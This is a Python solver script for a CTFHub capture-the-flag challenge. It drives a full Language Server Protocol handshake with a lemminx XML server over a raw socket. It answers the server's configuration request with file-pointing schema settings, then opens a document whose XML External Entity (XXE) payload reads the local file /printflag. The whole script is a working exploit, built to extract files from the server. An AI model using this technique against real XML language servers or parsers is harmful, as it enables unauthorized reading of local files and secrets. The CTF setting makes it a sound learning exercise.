#!/usr/bin/env python3
"""CTFHub lemminx solver — full LSP handshake with config response."""
import socket, json, time, re

def lsp_send(s, msg):
    s.send(f'Content-Length: {len(msg)}\r\n\r\n{msg}'.encode())

def recv_lsp(s, timeout=3):
    """Receive and parse LSP messages."""
    s.settimeout(timeout)
    resp = b''
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk: break
            resp += chunk
    except socket.timeout:
        pass
    return resp

s = socket.socket()
s.settimeout(8)
s.connect(('challenge-62ed0840a851925f.sandbox.ctfhub.com', 22180))
print('Connected')

# Step 1: Initialize
init = json.dumps({'jsonrpc':'2.0','id':1,'method':'initialize',
    'params':{'processId':None,'rootUri':'file:///tmp','capabilities':{}}})
lsp_send(s, init)
time.sleep(0.2)

# Read init response
resp = recv_lsp(s, 1)
print(f'Init response: {len(resp)} bytes')

# Step 2: Send initialized
initd = json.dumps({'jsonrpc':'2.0','method':'initialized','params':{}})
lsp_send(s, initd)
print('Sent initialized')

# Step 3: Wait for workspace/configuration or client/registerCapability
time.sleep(0.3)
resp2 = recv_lsp(s, 2)
print(f'Post-init response: {len(resp2)} bytes')
print(resp2.decode('utf-8', errors='replace')[:1500])

# Check for workspace/configuration
if b'workspace/configuration' in resp2:
    print('\n*** Got workspace/configuration! ***')
    # Find all LSP messages
    for match in re.finditer(rb'\{"jsonrpc":"2\.0","id":"([^"]+)","method":"workspace/configuration"', resp2):
        req_id = match.group(1).decode()
        print(f'  Config request id: {req_id}')

        # Respond with XML settings that might enable entity resolution
        config = json.dumps({
            'jsonrpc':'2.0',
            'id': req_id,
            'result': [{
                'xml': {
                    'catalogs': [],
                    'fileAssociations': [{
                        'pattern': '**/*',
                        'systemId': 'file:///printflag'
                    }],
                    'symbols': {
                        'externalSchema': {'enabled': True}
                    },
                    'validation': {
                        'schema': '/printflag'
                    }
                }
            }]
        })
        lsp_send(s, config)
        print(f'  Sent config response')

        # Now open an XML file to trigger processing
        xxe = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///printflag">]><foo>&xxe;</foo>'
        did_open = json.dumps({'jsonrpc':'2.0','id':10,'method':'textDocument/didOpen',
            'params':{'textDocument':{'uri':'file:///tmp/test.xml','languageId':'xml','version':1,'text':xxe}}})
        lsp_send(s, did_open)
        print('  Sent didOpen with XXE')

        time.sleep(0.3)
        final_resp = recv_lsp(s, 3)
        print(f'\nFinal responses ({len(final_resp)} bytes):')
        print(final_resp.decode('utf-8', errors='replace')[:2000])
else:
    print('\nNo workspace/configuration request found')

s.close()
